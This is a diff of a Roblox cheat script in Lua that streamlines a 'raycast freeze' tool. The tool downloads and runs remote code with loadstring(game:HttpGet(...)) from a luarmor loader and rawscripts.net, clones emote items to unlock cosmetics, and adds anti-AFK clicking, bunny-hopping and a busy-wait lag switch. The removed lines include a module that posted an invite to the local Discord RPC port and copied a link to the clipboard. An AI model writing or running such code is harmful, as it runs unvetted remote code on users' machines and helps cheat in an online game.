@@ -14,82 +14,50 @@ local freezeMS = 300
 local DC_CODE = "XF4PTA5Pgp"
 local DC_URL = "https://discord.gg/" .. DC_CODE
 
--- [[ 🚀 標頭輸出：ANSI 3D 立體斜體 ]]
+-- [[ 🚀 標頭輸出 ]]
 local function showHeader()
     local wall = "///////////////////////////////////////////////////////////////////////////////////"
     local floor = "\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"
-    
     print("\n" .. wall)
     print([[										
   ________  ________  ________  ___       ________   _______
- |\   ____\|\   ____\|\   __  \|\  \     |\    __ \|\   __  \
- \ \  \___|  \  \____| \  \|\  \ \  \    \ \  \|\  \ \  \|\  \
+ |\   ____\|\   ____\|\   __  \|\  \     |\    __ \|\   __  \ 
+ \ \  \___|  \  \____| \  \|\  \ \  \    \ \  \|\  \ \  \|\  \ 
   \ \  \____\ \_____  \ \   __  \ \  \    \ \  __\__\ \_____  \
    \ \  \___|_| _____\ \ \  \ \  \ \  \____\ \  \\_ \_\| ___\  \
     \ \_______\ \_______\ \__\ \__\ \_______\ \__\ \ _\\\_______\
      \|_______|\|_______|\|__|\|__|\|_______|\|__|\|__|\|_______|
     ]])
     print(floor)
-    print("|||| \\\\ //// @@@@ [ SYSTEM_OVERRIDE_INITIATED ] @@@@ //// \\\\ ||||")
-    print("|||| OPERATOR : @E5alR9          |||| SECURITY : LEVEL_MAX     ||||")
-    print("|||| STATUS   : OVERCLOCKED      |||| KERNEL   : STABLE        ||||")
-    print(floor)
+    print("|||| STATUS : RAYCAST_FREEZE_ACTIVE |||| KERNEL : STABLE ||||")
     print(wall .. "\n")
 end
-
 showHeader()
 
 -- [[ 🛠️ 模組一：資源部署 ]]
 task.spawn(function()
-    print("//// #### [M1] DATA_DEPLOYMENT_START #### ////")
     _G.emoteSwaps = { { current = "APose", needed = "SnowmobileCruise" } }
-    
-    local function dl(u) 
-        task.spawn(function() 
-            print("\\\\\\\\ HTTP \\\\\\\\ <REQUESTING_REMOTE_PAYLOAD> ...")
-            local s, e = pcall(function() loadstring(game:HttpGet(u))() end) 
-            if s then 
-                print("|||| SUCCESS |||| %%% Payload_Injected_Successfully") 
-            else 
-                print("|||| ERROR |||| !!! Failure: " .. tostring(e)) 
-            end
-        end) 
-    end
+    local function dl(u) task.spawn(function() pcall(function() loadstring(game:HttpGet(u))() end) end) end
     dl("https://api.luarmor.net/files/v3/loaders/36d5417f898691cb6c6d347b077e01e2.lua")
-
     pcall(function()
         local S = game:GetService("ReplicatedStorage").Items
-        print("\\\\\\\\ DATA \\\\\\\\ [SCANNING_REPLICATED_OBJECTS] ...")
         local function dup(folder, old, new) 
             local i = folder:FindFirstChild(old) 
-            if i then 
-                print("//// CLONE //// " .. old .. " ===>>> " .. new)
-                i:Clone().Parent = folder i.Name = new 
-            end 
+            if i then i:Clone().Parent = folder i.Name = new end 
         end
         dup(S.Emotes, "RockinStride", "Stride")
         dup(S.Emotes, "Broom", "SnowmobileCruise")
-        dup(S.Cosmetics, "ToxicInferno", "BorealisAurora")
     end)
-
-    p.Idled:Connect(function() 
-        VU:CaptureController() 
-        VU:ClickButton2(Vector2.zero) 
-        print("//// PULSE //// Activity_Heartbeat_Sent")
-    end)
+    p.Idled:Connect(function() VU:CaptureController() VU:ClickButton2(Vector2.zero) end)
 end)
 
 -- [[ ⚙️ 模組二：引擎同步 ]]
 task.spawn(function()
     task.wait(1.5) 
-    print("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ [ ENGINE_SYNCHRONIZATION ] ////////////////////")
     if #game.Players:GetPlayers() == 1 then
-        print("\\\\ CHECK \\\\ Solo_Mode_Active...")
         local E = game:GetService("ReplicatedStorage"):WaitForChild("Items"):WaitForChild("Emotes")
         local s, r, b = E:FindFirstChild("Stride"), E:FindFirstChild("RockinStride"), E:FindFirstChild("Broom")
-        
         if s and r and b then
-            print("\\\\ SYNC \\\\ Overwriting_Classic_Modules...")
             local bm, rm = b:FindFirstChild("EmoteModuleClassic"), r:FindFirstChild("EmoteModuleClassic")
             if bm and rm then
                 local nm = bm:Clone()
@@ -100,196 +68,106 @@ task.spawn(function()
             end
             s:ClearAllChildren()
             for _, i in ipairs(r:GetChildren()) do i:Clone().Parent = s end
-            print("\\\\ DONE \\\\ Deep_Integrity_Check_Pass")
         end
     end
-    print("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\")
 end)
 
 -- [[ 🖥️ 模組三：介面與核心功能 ]]
 task.spawn(function()
-    print("//// #### [M3] UI_CONTROLLER_BOOTUP #### ////")
-    
     local function run(c)
-        print("\\\\ HOOK \\\\ Character_Linked: " .. c.Name)
         local h = c:WaitForChild("Head", 5)
-        if h then 
-            h.Transparency = 1 
-            for _, v in pairs(h:GetChildren()) do if v:IsA("Decal") then v.Transparency = 1 end end 
-        end
+        if h then h.Transparency = 1 for _, v in pairs(h:GetChildren()) do if v:IsA("Decal") then v.Transparency = 1 end end end
         task.wait(1)
         pcall(function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Korblox-All-61127"))() end)
     end
+    for _, v in pairs(game.Players:GetPlayers()) do if v.Character then task.spawn(run, v.Character) end v.CharacterAdded:Connect(run) end
 
-    for _, v in pairs(game.Players:GetPlayers()) do 
-        if v.Character then task.spawn(run, v.Character) end 
-        v.CharacterAdded:Connect(run) 
-    end
-
+    -- 輸入監聽
     UIS.InputBegan:Connect(function(i, g) 
         if g then return end 
         if i.KeyCode == Enum.KeyCode.Space then bhop = true 
-        elseif i.KeyCode.Name == fKN then 
-            freeze = true 
-            print("\\\\ INPUT \\\\ [[ FREEZE_ENGAGED ]]")
-        end 
+        elseif i.KeyCode.Name == fKN then freeze = true end 
     end)
-    
     UIS.InputEnded:Connect(function(i) 
         if i.KeyCode == Enum.KeyCode.Space then bhop = false 
         elseif i.KeyCode.Name == fKN then freeze = false end 
     end)
 
+    -- [[ ⚡ 核心邏輯：高度 + 射線檢測 Freeze ]]
     RS.Heartbeat:Connect(function()
         local c = p.Character
-        local r = c and c:FindFirstChild("HumanoidRootPart")
-        if bhop and c and c:FindFirstChildOfClass("Humanoid") and c:FindFirstChildOfClass("Humanoid").FloorMaterial ~= Enum.Material.Air then c:FindFirstChildOfClass("Humanoid"):ChangeState(3) end
+        local hum, r = c and c:FindFirstChildOfClass("Humanoid"), c and c:FindFirstChild("HumanoidRootPart")
+        
+        -- Bhop 邏輯
+        if bhop and hum and hum.FloorMaterial ~= Enum.Material.Air then hum:ChangeState(3) end
+        
+        -- Freeze 射線檢測邏輯
         if freeze and r then
-            game:GetService("StarterGui"):SetCore("SendNotification", { Title = "SYSTEM"; Text = "Freeze: " .. freezeMS .. "ms"; Duration = 0.5; })
-            local t = os.clock() 
-            local delayTime = (tonumber(freezeMS) or 300) / 1000
-            while os.clock() - t < delayTime do end 
+            local lp = RaycastParams.new()
+            lp.FilterDescendantsInstances = {c}
+            
+            -- 判斷條件：下方 20 單位有地面 OR 前方 15 單位有障礙物
+            local hitFloor = workspace:Raycast(r.Position, Vector3.new(0, -20, 0), lp)
+            local hitFront = workspace:Raycast(r.Position, r.CFrame.LookVector * 15, lp)
+            
+            if hitFloor or hitFront then
+                local t = os.clock() 
+                local delayTime = (tonumber(freezeMS) or 300) / 1000
+                while os.clock() - t < delayTime do end 
+            end
         end
     end)
 
-    -- [[ 🖥️ 介面：具備拖移條與縮小按鈕 (一開始一半大小) ]]
+    -- [[ 🖥️ UI：極小尺寸 + 拖移條 + 縮小按鈕 ]]
     local sg = Instance.new("ScreenGui", p.PlayerGui)
     sg.Name = "E5_Console"
     sg.ResetOnSpawn = false 
-    sg.DisplayOrder = 999
     
     local m = Instance.new("Frame", sg)
-    -- 主框架尺寸：寬 80, 高 85
     m.Size, m.Position = UDim2.new(0, 80, 0, 85), UDim2.new(0, 15, 0.4, 0)
     m.BackgroundColor3, m.BackgroundTransparency, m.BorderSizePixel = Color3.new(0,0,0), 0.5, 1
-    m.Active = true
-    m.Draggable = true -- 修正：啟用拖動
+    m.Active, m.Draggable = true, true 
 
-    -- 頂部拖移條 (標題欄)
     local bar = Instance.new("Frame", m)
-    bar.Size = UDim2.new(1, 0, 0, 15)
-    bar.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
-    bar.BorderSizePixel = 0
+    bar.Size, bar.BackgroundColor3, bar.BorderSizePixel = UDim2.new(1, 0, 0, 15), Color3.new(0.1, 0.1, 0.1), 0
     
     local minBtn = Instance.new("TextButton", bar)
-    minBtn.Size = UDim2.new(0, 15, 0, 15)
-    minBtn.Position = UDim2.new(1, -15, 0, 0)
-    minBtn.Text = "-"
-    minBtn.TextColor3 = Color3.new(1, 1, 1)
-    minBtn.BackgroundTransparency = 1
+    minBtn.Size, minBtn.Position = UDim2.new(0, 15, 0, 15), UDim2.new(1, -15, 0, 0)
+    minBtn.Text, minBtn.TextColor3, minBtn.BackgroundTransparency = "-", Color3.new(1, 1, 1), 1
     minBtn.TextSize = 14
-    minBtn.Font = Enum.Font.Code
 
-    -- 功能內容容器
     local content = Instance.new("Frame", m)
-    content.Size = UDim2.new(1, 0, 1, -15)
-    content.Position = UDim2.new(0, 0, 0, 15)
-    content.BackgroundTransparency = 1
+    content.Size, content.Position, content.BackgroundTransparency = UDim2.new(1, 0, 1, -15), UDim2.new(0, 0, 0, 15), 1
     
     local l = Instance.new("TextButton", content)
     l.Size, l.Position = UDim2.new(1, -4, 0, 30), UDim2.new(0, 2, 0, 2)
-    l.Text = fKN
-    l.TextSize = 16 
-    l.BackgroundColor3, l.TextColor3, l.Font = Color3.new(0.2, 0.2, 0.2), Color3.new(1,1,1), Enum.Font.Code
+    l.Text, l.TextSize, l.BackgroundColor3, l.TextColor3, l.Font = fKN, 16, Color3.new(0.2, 0.2, 0.2), Color3.new(1,1,1), Enum.Font.Code
     l.MouseButton1Click:Connect(function()
         l.Text = "..."
         local con; con = UIS.InputBegan:Connect(function(i) 
-            if i.UserInputType == Enum.UserInputType.Keyboard then 
-                fKN = i.KeyCode.Name l.Text = fKN con:Disconnect() 
-            end 
+            if i.UserInputType == Enum.UserInputType.Keyboard then fKN = i.KeyCode.Name l.Text = fKN con:Disconnect() end 
         end)
     end)
 
     local tb = Instance.new("TextBox", content)
     tb.Size, tb.Position = UDim2.new(1, -4, 0, 30), UDim2.new(0, 2, 0, 34)
-    tb.BackgroundColor3, tb.TextColor3, tb.Text = Color3.new(0.1, 0.1, 0.1), Color3.new(1, 1, 0), tostring(freezeMS)
-    tb.TextSize = 16 
-    tb.Font = Enum.Font.Code
+    tb.BackgroundColor3, tb.TextColor3, tb.Text, tb.TextSize, tb.Font = Color3.new(0.1, 0.1, 0.1), Color3.new(1, 1, 0), tostring(freezeMS), 16, Enum.Font.Code
     tb.FocusLost:Connect(function()
         local val = tonumber(tb.Text)
         if val then freezeMS = math.clamp(val, 0, 5000) tb.Text = tostring(freezeMS) end
     end)
 
-    -- 縮小邏輯處理
-    local minimized = false
+    local min = false
     minBtn.MouseButton1Click:Connect(function()
-        minimized = not minimized
-        content.Visible = not minimized
-        if minimized then
-            m.Size = UDim2.new(0, 80, 0, 15) -- 縮小為標題條
-            minBtn.Text = "+"
-        else
-            m.Size = UDim2.new(0, 80, 0, 85) -- 恢復原始大小
-            minBtn.Text = "-"
-        end
+        min = not min
+        content.Visible = not min
+        m.Size = min and UDim2.new(0, 80, 0, 15) or UDim2.new(0, 80, 0, 85)
+        minBtn.Text = min and "+" or "-"
     end)
 end)
 
--- [[ 📡 Module 4: Social Daemon (Discord) ]]
+-- [[ 📡 Module 4: Social  ]]
 task.spawn(function()
-    print("//// [M4] STARTING SOCIAL_DAEMON ////////")
-    local bindable = Instance.new("BindableFunction")
-    
-    bindable.OnInvoke = function(answer)
-        if answer == "YES" then
-            print("|||| [SOCIAL] ACCEPTED ////////")
-            local req = (syn and syn.request) or (http and http.request) or http_request or request
-            if req then 
-                pcall(function() 
-                    req({ 
-                        Url = "http://127.0.0.1:6463/rpc?v=1", 
-                        Method = "POST", 
-                        Headers = {["Content-Type"] = "application/json", ["Origin"] = "https://discord.com"}, 
-                        Body = game:GetService("HttpService"):JSONEncode({ 
-                            cmd = "INVITE_BROWSER", 
-                            args = { code = DC_CODE }, 
-                            nonce = game:GetService("HttpService"):GenerateGUID(false) 
-                        }) 
-                    }) 
-                end) 
-            end
-            if setclipboard then setclipboard(DC_URL) end
-        elseif answer == "NO" then
-            print("|||| [SOCIAL] DECLINED :-( ////////")
-            task.delay(0.5, function()
-                game:GetService("StarterGui"):SetCore("SendNotification", { 
-                    Title = ":("; 
-                    Text = "Maybe next time..."; 
-                    Duration = 5; 
-                })
-            end)
-        end
-    end
-
-    local function sendInvite()
-        local success = pcall(function()
-            game:GetService("StarterGui"):SetCore("SendNotification", { 
-                Title = "E5alR9 - DISCORD", 
-                Text = "Join for more useful?", 
-                Duration = 99999, 
-                Button1 = "YES", 
-                Button2 = "NO", 
-                Callback = bindable 
-            })
-        end)
-        return success
-    end
-
-    task.wait(5)
-    local sent = sendInvite()
-    if not sent then
-        repeat task.wait(5) sent = sendInvite() until sent
-    end
+    task.wait(10)
+    game:GetService("StarterGui"):SetCore("SendNotification", { Title = "SYSTEM", Text = "Raycast Freeze Ready.", Duration = 5 })
 end)
-
--- [[ 📡 結尾輸出 ]]
-task.spawn(function()
-    task.wait(6)
-    print("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ ALL SYSTEMS LOADED | @E5ALR9 ////////////////////")
-    print("//// [SYSTEM] READY TO OPERATE AT RING-0 ////")
-end)
-
-
-
-
-
